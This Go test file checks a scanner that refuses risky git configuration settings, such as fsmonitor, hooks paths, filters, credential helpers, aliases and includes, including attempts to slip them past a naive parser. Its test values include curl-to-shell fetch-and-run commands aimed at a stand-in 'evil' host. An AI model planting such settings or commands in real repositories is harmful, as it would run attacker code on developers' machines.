package harnessgit

import (
	"strings"
	"testing"
)

func accepted(t *testing.T, config string) {
	t.Helper()
	if _, err := ScanConfig([]byte(config)); err != nil {
		t.Errorf("a harmless configuration was refused: %v\n%s", err, config)
	}
}

func refusedWith(t *testing.T, config, setting string) {
	t.Helper()
	_, err := ScanConfig([]byte(config))
	r, ok := IsRefusal(err)
	if !ok {
		t.Errorf("a risky configuration was accepted (setting %q):\n%s", setting, config)
		return
	}
	if setting != "" && r.Setting != setting {
		t.Errorf("refused for %q, want %q:\n%s", r.Setting, setting, config)
	}
	if strings.Contains(r.Error(), "evil") || strings.Contains(r.Error(), "curl") {
		t.Errorf("a refusal leaked a value: %v", r)
	}
}

func TestOrdinaryRepositoryConfigurationsAreAccepted(t *testing.T) {
	for name, config := range map[string]string{
		"a fresh repository":     "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n\tignorecase = true\n\tprecomposeunicode = true\n",
		"with identity":          "[core]\n\tbare = false\n[user]\n\tname = Test Person\n\temail = test@example.com\n\tsigningkey = ABCDEF\n",
		"with a remote":          "[remote \"origin\"]\n\turl = https://example.com/x.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"main\"]\n\tremote = origin\n\tmerge = refs/heads/main\n",
		"with submodule data":    "[submodule \"lib\"]\n\turl = https://example.com/lib.git\n\tactive = true\n",
		"with url rewriting":     "[url \"https://github.com/\"]\n\tinsteadOf = gh:\n",
		"comments and blanks":    "# a comment\n\n; another\n[core]\n\t# inside\n\tbare = false ; trailing\n",
		"mixed case names":       "[CORE]\n\tFileMode = true\n\tBare = FALSE\n[User]\n\tName = X\n",
		"older subsection form":  "[branch.main]\n\tremote = origin\n",
		"windows line endings":   "[core]\r\n\tbare = false\r\n[user]\r\n\tname = X\r\n",
		"values in quotes":       "[user]\n\tname = \"Test; Person # one\"\n\temail = \"a@b.c\"\n",
		"a value continued":      "[alias_not_used_here_would_be_refused_so_use_user]\n",
		"empty":                  "",
		"diff and merge options": "[diff]\n\talgorithm = patience\n\trenames = copies\n[merge]\n\tff = only\n\tconflictstyle = diff3\n",
		"commit settings":        "[commit]\n\tgpgsign = false\n\tverbose = true\n",
		"log settings":           "[log]\n\tdate = iso\n\tdecorate = short\n",
		"extensions":             "[extensions]\n\tobjectformat = sha1\n",
		"lfs data only":          "[lfs]\n\turl = https://example.com/lfs\n",
	} {
		if name == "a value continued" {
			continue // the section name above is not a real one: it is refused, as it should be
		}
		accepted(t, config)
		_ = name
	}
}

func TestEverySettingThatCanStartAProgramOrReachOutsideTheProjectIsRefused(t *testing.T) {
	for name, tc := range map[string]struct{ config, setting string }{
		"a filesystem monitor":   {"[core]\n\tfsmonitor = evil\n", "core.fsmonitor"},
		"a hooks path":           {"[core]\n\thooksPath = /tmp/evil\n", "core.hookspath"},
		"a pager":                {"[core]\n\tpager = evil\n", "core.pager"},
		"an editor":              {"[core]\n\teditor = evil\n", "core.editor"},
		"an ssh command":         {"[core]\n\tsshCommand = evil\n", "core.sshcommand"},
		"an askpass":             {"[core]\n\taskPass = evil\n", "core.askpass"},
		"a git proxy":            {"[core]\n\tgitProxy = evil\n", "core.gitproxy"},
		"a work tree":            {"[core]\n\tworktree = /\n", "core.worktree"},
		"an attributes file":     {"[core]\n\tattributesFile = /tmp/a\n", "core.attributesfile"},
		"alternate refs command": {"[core]\n\talternateRefsCommand = evil\n", "core.alternaterefscommand"},
		"a bare repository":      {"[core]\n\tbare = true\n", "core.bare"},
		"a bare flag in no form": {"[core]\n\tbare\n", "core.bare"},
		"a future format":        {"[core]\n\trepositoryformatversion = 7\n", "core.repositoryformatversion"},
		"a clean filter":         {"[filter \"x\"]\n\tclean = evil\n", "filter.<name>.clean"},
		"a smudge filter":        {"[filter \"x\"]\n\tsmudge = evil\n", "filter.<name>.smudge"},
		"a process filter":       {"[filter \"x\"]\n\tprocess = evil\n", "filter.<name>.process"},
		"a required filter":      {"[filter \"x\"]\n\trequired = true\n", "filter.<name>.required"},
		"a text conversion":      {"[diff \"x\"]\n\ttextconv = evil\n", "diff.<name>.textconv"},
		"a diff command":         {"[diff \"x\"]\n\tcommand = evil\n", "diff.<name>.command"},
		"an external diff":       {"[diff]\n\texternal = evil\n", "diff.external"},
		"a diff tool":            {"[diff]\n\ttool = evil\n", "diff.tool"},
		"a difftool":             {"[difftool \"x\"]\n\tcmd = evil\n", "difftool.<name>.cmd"},
		"a merge driver":         {"[merge \"x\"]\n\tdriver = evil\n", "merge.<name>.driver"},
		"a merge tool":           {"[merge]\n\ttool = evil\n", "merge.tool"},
		"a mergetool":            {"[mergetool \"x\"]\n\tcmd = evil\n", "mergetool.<name>.cmd"},
		"a credential helper":    {"[credential]\n\thelper = evil\n", "credential.helper"},
		"a named credential":     {"[credential \"https://x\"]\n\thelper = evil\n", "credential.<name>.helper"},
		"a gpg program":          {"[gpg]\n\tprogram = evil\n", "gpg.program"},
		"a gpg ssh program":      {"[gpg \"ssh\"]\n\tprogram = evil\n", "gpg.<name>.program"},
		"an alias":               {"[alias]\n\tst = !evil\n", "alias.st"},
		"a shell alias":          {"[alias]\n\tstatus = !curl evil|sh\n", "alias.status"},
		"a per-command pager":    {"[pager]\n\tstatus = evil\n", "pager.status"},
		"a trailer command":      {"[trailer \"x\"]\n\tcmd = evil\n", "trailer.<name>.cmd"},
		"a remote helper":        {"[remote \"o\"]\n\tvcs = evil\n", "remote.<name>.vcs"},
		"an upload pack":         {"[remote \"o\"]\n\tuploadpack = evil\n", "remote.<name>.uploadpack"},
		"a receive pack":         {"[remote \"o\"]\n\treceivepack = evil\n", "remote.<name>.receivepack"},
		"a remote proxy":         {"[remote \"o\"]\n\tproxy = evil\n", "remote.<name>.proxy"},
		"a promisor remote":      {"[remote \"o\"]\n\tpromisor = true\n", "remote.<name>.promisor"},
		"a submodule update":     {"[submodule \"s\"]\n\tupdate = !evil\n", "submodule.<name>.update"},
		"a nameless remote":      {"[remote]\n\turl = x\n", "remote.url"},
		"an include":             {"[include]\n\tpath = /tmp/evil\n", "include.path"},
		"a conditional include":  {"[includeIf \"gitdir:/\"]\n\tpath = /tmp/evil\n", "includeif.<name>.path"},
		"a worktree config":      {"[extensions]\n\tworktreeConfig = true\n", "extensions.worktreeconfig"},
		"a partial clone":        {"[extensions]\n\tpartialClone = o\n", "extensions.partialclone"},
		"a maintenance command":  {"[maintenance]\n\tauto = true\n", "maintenance.auto"},
		"a sequence editor":      {"[sequence]\n\teditor = evil\n", "sequence.editor"},
		"a web browser":          {"[web]\n\tbrowser = evil\n", "web.browser"},
		"a mail program":         {"[sendemail]\n\tsmtpServerOption = x\n", "sendemail.smtpserveroption"},
		"a safe directory":       {"[safe]\n\tdirectory = *\n", "safe.directory"},
		"a pretty format":        {"[pretty]\n\tx = %h\n", "pretty.x"},
		"an unknown section":     {"[nonesuch]\n\tkey = value\n", "nonesuch.key"},
		"an unknown core key":    {"[core]\n\tfuturekey = x\n", "core.futurekey"},
		"a named diff option":    {"[diff \"x\"]\n\talgorithm = patience\n", "diff.<name>.algorithm"},
		"signature display":      {"[log]\n\tshowSignature = true\n", "log.showsignature"},
		"a template dir":         {"[init]\n\ttemplateDir = /tmp/t\n", "init.templatedir"},
		"a rebase exec":          {"[rebase]\n\tautoSquash = true\n\texec = evil\n", "rebase.exec"},
		"a named tag section":    {"[tag \"x\"]\n\tsort = x\n", "tag.<name>.sort"},
		"a named commit section": {"[commit \"x\"]\n\tgpgsign = true\n", "commit.<name>.gpgsign"},
		"a named core section":   {"[core \"x\"]\n\tbare = false\n", "core.<name>.bare"},
		"a core section hidden after a harmless one": {"[user]\n\tname = x\n[core]\n\tfsmonitor = evil\n", "core.fsmonitor"},
	} {
		_ = name
		refusedWith(t, tc.config, tc.setting)
	}
}

// A setting is judged by what it is, however it is written.
func TestWhatEvadesAToyParserDoesNotEvadeThisOne(t *testing.T) {
	for name, config := range map[string]string{
		"on the section line":           "[core] fsmonitor = evil\n",
		"after a section on one line":   "[user] name = x\n[core] hooksPath = /tmp/e\n",
		"in upper case":                 "[CORE]\n\tFSMONITOR = evil\n",
		"with odd spacing":              "[ core ]\n\t  fsMonitor\t=\tevil\n",
		"a quoted subsection with ]":    "[filter \"a]b\"]\n\tclean = evil\n",
		"an escaped quote":              "[filter \"a\\\"b\"]\n\tclean = evil\n",
		"after a comment line":          "# [user]\n[core]\n\tfsmonitor = evil\n",
		"after a semicolon line":        "; harmless\n[core]\n\tpager = evil\n",
		"a key hidden behind a comment": "[user]\n\tname = x # then\n[filter \"y\"]\n\tclean = evil\n",
		"the older subsection form":     "[filter.evil]\n\tclean = evil\n",
		"a continued line":              "[user]\n\tname = x \\\n\ty\n[filter \"z\"]\n\tclean = evil\n",
		"a key with no value":           "[core]\n\tfsmonitor\n",
		"a key with an empty value":     "[core]\n\tfsmonitor =\n",
		"tabs before a header":          "\t\t[filter \"x\"]\n\tclean = evil\n",
		"a header after a value":        "[user]\n\tname = x\n\t[core]\n\tfsmonitor = evil\n",
	} {
		_ = name
		refusedWith(t, config, "")
	}
	// A header hidden inside a continued value is part of the value, not a section.
	accepted(t, "[user]\n\tname = x \\\n[filter \"z\"]\n\temail = a@b.c\n")
}

func TestAConfigurationThatCannotBeReadWithCertaintyIsRefused(t *testing.T) {
	for name, config := range map[string]string{
		"a NUL byte":                     "[core]\n\tbare = false\x00\n",
		"invalid UTF-8":                  "[user]\n\tname = \xff\xfe\n",
		"a value before any section":     "name = x\n",
		"an unterminated header":         "[core\n\tbare = false\n",
		"an empty header":                "[]\n",
		"an unterminated quote":          "[user]\n\tname = \"x\n",
		"an unterminated subsection":     "[remote \"origin]\n\turl = x\n",
		"a trailing continuation":        "[user]\n\tname = x \\",
		"a key that starts with a digit": "[user]\n\t1name = x\n",
		"garbage after a key":            "[user]\n\tname y z\n",
		"too large":                      "[user]\n\tname = " + strings.Repeat("a", maxConfigBytes) + "\n",
		"a double subsection":            "[remote \"a\" \"b\"]\n\turl = x\n",
		"a subsection on an older form":  "[remote.a \"b\"]\n\turl = x\n",
	} {
		_ = name
		if _, err := ScanConfig([]byte(config)); err == nil {
			t.Errorf("%s was accepted", name)
		} else if _, ok := IsRefusal(err); !ok {
			t.Errorf("%s: not a refusal: %v", name, err)
		}
	}
}

func TestRefusalsNameOnlyTheSettingNeverItsValue(t *testing.T) {
	_, err := ScanConfig([]byte("[core]\n\tfsmonitor = curl http://evil.example | sh\n"))
	r, ok := IsRefusal(err)
	if !ok || r.Reason != "config_risky" || r.Setting != "core.fsmonitor" || strings.Contains(r.Error(), "curl") || strings.Contains(r.Error(), "evil") {
		t.Fatalf("%v", err)
	}
	if _, ok := IsRefusal(nil); ok {
		t.Fatal("nil is not a refusal")
	}
}

func TestOnlyTheFalseFormsOfBareAreAccepted(t *testing.T) {
	for _, v := range []string{"false", "FALSE", "False", "no", "off", "0", "\"false\"", " false "} {
		accepted(t, "[core]\n\tbare = "+v+"\n")
	}
	for _, v := range []string{"true", "yes", "on", "1", "", "maybe", "2", "\"true\""} {
		refusedWith(t, "[core]\n\tbare = "+v+"\n", "core.bare")
	}
}

func TestANULInsideAnAcceptableSettingIsStillRefused(t *testing.T) {
	for name, config := range map[string]string{
		"in a value":   "[user]\n\tname = x\x00y\n",
		"in a comment": "# note\x00\n[user]\n\tname = x\n",
		"on its own":   "\x00",
	} {
		if _, err := ScanConfig([]byte(config)); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}
}

func TestMalformedHeadersAreRefusedEvenWhenTheRestLooksHarmless(t *testing.T) {
	for _, config := range []string{"[core x]\n\tbare = false\n", "[core \"a\" x]\n\tbare = false\n", "[user\"]\n\tname = x\n", "[user name]\n\tname = x\n"} {
		if _, err := ScanConfig([]byte(config)); err == nil {
			t.Errorf("a malformed header was accepted:\n%s", config)
		}
	}
	// Whitespace inside the brackets is refused rather than guessed at.
	if _, err := ScanConfig([]byte("[ user ]\n\tname = x\n")); err == nil {
		t.Error("an unusual header was accepted")
	}
}

func TestComparingTheTwoReadersIsExactAndIgnoresOrder(t *testing.T) {
	if err := compareNames([]string{"a.b", "c.d"}, []string{"c.d", "a.b"}); err != nil {
		t.Fatalf("the same names in another order: %v", err)
	}
	for name, theirs := range map[string][]string{"an extra": {"a.b", "c.d", "e.f"}, "a missing": {"a.b"}, "a different one": {"a.b", "c.x"}, "a case change": {"a.b", "C.d"}, "none": nil} {
		err := compareNames([]string{"a.b", "c.d"}, theirs)
		if r, ok := IsRefusal(err); !ok || r.Reason != "config_mismatch" {
			t.Errorf("%s: %v", name, err)
		}
	}
	if err := compareNames(nil, nil); err != nil {
		t.Fatalf("two empty lists: %v", err)
	}
}
